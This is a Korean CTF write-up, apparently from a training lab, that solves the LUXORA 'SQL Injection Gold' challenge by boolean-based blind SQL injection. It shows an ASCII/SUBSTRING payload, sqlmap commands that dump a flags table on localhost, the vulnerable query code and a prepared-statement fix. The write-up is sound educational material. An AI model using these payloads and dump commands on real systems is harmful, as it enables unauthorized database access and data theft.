+++
title = "VulnABLE CTF [LUXORA] Write-up: SQL Injection 🥇 Gold"
description = "LUXORA 플랫폼의 Boolean-based Blind SQL Injection 상세 공략 롸잇업 (스무고개 방식과 sqlmap 활용)"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Gold", "Blind SQLi", "sqlmap", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SQL Injection 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (SQLi)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/sqli/gold`
- **목표**: 에러 메시지나 데이터베이스의 결과가 화면에 전혀 출력되지 않는 상황에서 참/거짓 반응만을 이용해 숨겨진 플래그를 추출하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/sqli/gold` 페이지는 상품의 ID를 입력받아 재고가 있는지 없는지만을 알려주는 기능을 수행합니다.
URL 요청은 다음과 같습니다.
```http
GET /sqli/gold?product_id=1
```

정상 입력 시 화면 응답:
```html
<p class="status">✅ In Stock</p>
```

없는 상품 입력 시(`product_id=999`) 화면 응답:
```html
<p class="status">❌ Out of Stock</p>
```

SQL 인젝션의 존재를 확인하기 위해 특수문자 `'` 를 넣어봅니다.
```http
GET /sqli/gold?product_id=1'
```
서버는 에러 메시지 대신 그저 `❌ Out of Stock` 이라고만 응답합니다.

**[해커의 사고 과정]**
1. 쿼리 결과나 에러가 화면에 직접 출력되지 않는 환경이다 (Blind 환경).
2. 하지만 쿼리의 결과가 `참(True)`일 때는 `✅ In Stock`, `거짓(False)`일 때는 `❌ Out of Stock` 이라는 명확한 차이가 있다.
3. 이를 이용하여, 데이터베이스에게 **"데이터베이스 이름의 첫 글자가 'a'니?"** 라고 스무고개 질문을 던져서 하나씩 데이터를 유추할 수 있다! (Boolean-based Blind SQL Injection)

---

## 💥 2. 스무고개 페이로드 설계 (Exploitation Strategy)

데이터베이스의 버전을 알아내거나 플래그를 찾기 위해 논리 연산자와 내장 함수를 결합합니다.

### 💡 활용할 SQL 내장 함수 (MySQL 기준)
- `database()` : 현재 사용 중인 데이터베이스의 이름을 반환
- `SUBSTRING(str, pos, len)` : 문자열의 특정 위치부터 길이만큼 잘라냄
- `ASCII(char)` : 문자를 아스키코드(숫자)로 변환 (숫자 비교가 문자 비교보다 필터링을 피하기 쉽고 효율적임)

### 🚀 첫 번째 질문 던지기
"현재 데이터베이스 이름의 첫 번째 글자가 아스키코드 108('l') 인가요?"

페이로드:
```sql
1 AND ASCII(SUBSTRING(database(), 1, 1)) = 108
```

URL에 인코딩하여 전송합니다.
```http
GET /sqli/gold?product_id=1%20AND%20ASCII(SUBSTRING(database(),1,1))=108
```

**[서버의 응답]**
```html
<p class="status">✅ In Stock</p>
```
응답이 `✅ In Stock`으로 돌아왔습니다! 이는 쿼리가 참(True)이라는 뜻이며, 데이터베이스 이름의 첫 글자가 `l`임을 알아냈습니다.
이런 식으로 두 번째 글자, 세 번째 글자를 모두 찾아냅니다.

---

## 🤖 3. 자동화 도구 활용 (sqlmap)

위와 같은 스무고개 방식을 사람이 직접 하면 엄청난 시간이 소요됩니다. 현업 모의해커나 CTF 플레이어는 이를 자동화해주는 툴인 **sqlmap**을 사용합니다.

### sqlmap으로 데이터베이스 정보 추출
```bash
$ sqlmap -u "http://localhost:3000/sqli/gold?product_id=1" --technique=B --dbs --batch
```
- `--technique=B`: Boolean-based Blind 기법만 사용.
- `--dbs`: 데이터베이스 목록 출력.
- `--batch`: 묻는 말에 모두 기본값(Y)으로 응답하여 멈추지 않고 진행.

sqlmap 구동 결과, `luxora_db` 라는 데이터베이스를 찾았습니다.

### sqlmap으로 플래그 테이블 덤프
`luxora_db` 안에 있는 테이블을 뒤져서 플래그를 덤프(Dump)합니다.
```bash
$ sqlmap -u "http://localhost:3000/sqli/gold?product_id=1" -D luxora_db -T flags --dump --batch
```

**[sqlmap 출력 결과]**
```text
Database: luxora_db
Table: flags
[1 entry]
+----+----------------------------------+
| id | flag_value                       |
+----+----------------------------------+
| 1  | FLAG{SQLI_🥇_BLIND_B7E412}       |
+----+----------------------------------+
```

---

## 🚩 4. 롸잇업 결론 및 플래그

화면에 데이터가 직접 노출되지 않는 환경에서도, 애플리케이션의 참/거짓 반응 차이를 이용하여 데이터베이스의 모든 정보를 스무고개 방식으로 유출해내는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{SQLI_🥇_BLIND_B7E412}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
개발자는 "에러가 화면에 안 보이면 안전하겠지"라고 생각했지만, 이는 근본적인 해결책이 아닙니다.

* **취약한 논리 구조**
```javascript
// 입력값을 그대로 쿼리에 조립하여 실행
const query = `SELECT * FROM products WHERE id = ${req.query.product_id}`;
// 결과가 있으면 In Stock, 없으면 Out of Stock 응답
```

* **안전한 패치 코드 (Prepared Statements)**
역시나 유일한 정답은 파라미터 바인딩입니다.
```javascript
const query = "SELECT * FROM products WHERE id = $1";
db.query(query, [req.query.product_id], ...);
```
이렇게 처리하면 해커가 `1 AND ASCII...` 를 입력해도 데이터베이스는 "아이디가 '1 AND ASCII...' 인 제품"을 찾으려 하므로 아무런 부가 쿼리도 실행되지 않습니다.